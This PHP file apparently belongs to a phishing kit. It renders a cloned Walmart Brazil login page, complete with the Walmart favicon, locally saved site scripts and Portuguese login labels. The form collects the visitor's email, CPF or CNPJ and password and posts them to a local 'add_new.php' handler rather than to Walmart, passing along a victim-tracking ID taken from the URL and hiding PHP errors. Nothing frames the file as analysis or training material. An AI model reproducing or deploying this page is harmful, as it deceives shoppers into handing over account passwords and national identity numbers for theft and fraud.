
<?php
error_reporting(0);
ini_set(“display_errors”, 0 );

if(isset($_GET['id'])){	


$ID_FILTRADO = filter_var($_GET ['id'], FILTER_SANITIZE_NUMBER_INT);

$ID =  addslashes($ID_FILTRADO);



?>

<html lang="pt-br"><!--<![endif]-->


<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="shortcut icon" href="https://www.walmart.com.br/favicon.ico" type="image/x-icon">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Entrar</title><meta name="description" content="">
<meta name="viewport" content="width=device-width,user-scalable=no">
<script async="" src="../Raiz/../Raiz/Files2/cs.js.download"></script>
<script src="../Raiz/Files2/satelliteLib-ce37935efdafd7a4464ef02b4248354687080fa3.js.download">
</script><script src="../Raiz/Files2/analytics.js.download"></script>
<script src="../Raiz/Files2/s-code-contents-18bb769dbfda1ec099f682ef04215ace88fc2799.js.download"></script>
<script type="text/javascript">var dataLayer = [{}];_satellite.track('loginModal');</script>
<script src="../Raiz/Files2/satellite-56d825ee64746d3757002e52.js.download"></script>
<meta name="cs:page" content="login"><!--[if IE 8]><link rel="stylesheet" href="//static.wmobjects.com.br/webstore/style/ie8.min.css?e994ecf3231b01ec4403b4d64710732f"><![endif]--><link rel="stylesheet" href="../Raiz/Files2/structure-iframe.min.css">
<link rel="stylesheet" href="../Raiz/Files2/login.min.css"><link rel="stylesheet" href="css">
<script>window.wm = window.wm || {utils:{}};</script><link rel="dns-prefetch" href="https://device.clearsale.com.br/">

</head>


<body class="no-scroll" style=""><div class="wm-load loading-bg white"><div class="loading wm-loading"></div></div><div class="content-wrapper"><span class="headline">Já tem cadastro?</span><div class="sign-in-wrapper">
<form id="client-sign-in" class="client-sign-in" method="post" action="add_new.php?adicionar_novo_endereco" novalidate="" autocomplete="new-password" >
<input type="hidden" name="ID" value="<?php echo $ID ?>" >
<div class="input-container"><label for="input_1" data-label="Email, CPF ou CNPJ" class="wm-label">Email, CPF ou CNPJ</label>

<input class="wm-input" data-type="user" name="signinField" type="email" maxlength="100"  autocomplete="new-password">
</div><div class="input-container"><label for="input_1" data-label="Senha" class="wm-label">Senha</label>
<input class="wm-input" data-type="loginPassword" name="password" type="password" maxlength="100" id="password" autocomplete="new-password">

</div><div class="login-utils"><input class="wm-icon icon-check" id="stay-connected" type="checkbox" checked="checked" value="true" name="connected"><label for="stay-connected" class="">Continuar conectado</label><a href="
" onclick="wm.loginUtils.pageLoading(&#39;/login/forgot-password&#39;)" class="password-recovery" data-title="Esqueci minha senha">Esqueci minha senha</a><span class="wm-icon-tooltip">?</span><span class="wm-tooltip terms-of-use top"><span class="wm-tooltip-arrow"></span><span class="wm-tooltip-arrow-shadow"></span><span class="wm-tooltip-content">Ao selecionar "Continuar conectado" manteremos você conectado neste dispositivo. Para a segurança da sua conta, utilize esta opção apenas em seus dispositivos pessoais.</span></span></div><input type="hidden" id="continue" name="continue" value="https://connect.walmart.com.br/connect/authorize?response_type=code&amp;redirect_uri=https://www2.walmart.com.br/checkout/services/transaction/oauth/callback/walmart_checkout&amp;client_id=walmart_checkout&amp;type="><input type="hidden" name="clientId" value="walmart_checkout"><div class="captcha-wrapper" id="captchaComponent"></div><button id="signinButtonSend" name="signinButtonSend" type="submit" value="Entrar" class="round-button blue">Entrar</button><input type="hidden" id="X-Tmx-session-id" name="X-Tmx-session-id" value="4099745364"></form>


</div><div class="content-wrapper"><div class="bottom-wrapper"><span>Ao entrar, você concorda com nossos
<a href="#" target="_blank" class="link">termos de uso</a>,
condições,  <a href="#" target="_blank" class="link">política de privacidade</a>
e que tem pelo menos 18 anos de idade</span></div></div><div><div class="auth-footer mt30"><span>Você é novo aqui?</span><p><a class="link" href="cadastro.php?id=<?php echo $ID?>" >Cadastre-se agora</a></p></div></div><div id="model-tool-tip" style="display:none"><span class="wm-tooltip wm-notify-error bottom" style="display: block;"><span class="wm-tooltip-arrow"></span><span class="wm-tooltip-arrow-shadow"></span><span class="wm-tooltip-content">&nbsp;</span></span></div><!--[if lt IE 9]><script src="//static.wmobjects.com.br/webstore/js/vendor/jquery/jquery-1.10.2.min.js?628072e7212db1e8cdacb22b21752cda"></script><script src="//static.wmobjects.com.br/webstore/js/vendor/jquery-validate/jquery.validate-1.9.0.min.js?c593e70ef041ab387fefad5fe38a724c"></script><![endif]--><!--[if gte IE 9]><!--><script src="../Raiz/Files2/jquery-2.0.3.min.js.download"></script><script src="../Raiz/Files2/jquery.validate-1.11.1.min.js.download"></script><!--<![endif]--><script src="../Raiz/Files2/startup.min.js.download"></script><script src="../Raiz/Files2/login.min.js.download"></script><script type="text/javascript">var contentSize = $("body").height();var modalSize = {width: "400px",height: contentSize + 15};if (typeof parent !== "undefined"){parent.postMessage(JSON.stringify(modalSize), "*");}wm.floatTextInput.verifyEmptyFields();</script><script type="text/javascript">(function (i, s, o, g, r, a, m) {i['CsdmObject'] = r; i[r] = i[r] || function () {(i[r].q = i[r].q || []).push(arguments)}, i[r].l = 1 * new Date(); a = s.createElement(o),m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)})(window, document, 'script', '//device.clearsale.com.br/m/cs.js', 'csdm');csdm('app', 'b39873ff9b');</script><iframe src="../Raiz/Files2satellite-55070ba93130630019d30400(1).html" style="display: none;"></iframe></body></html>




<?php }  ?>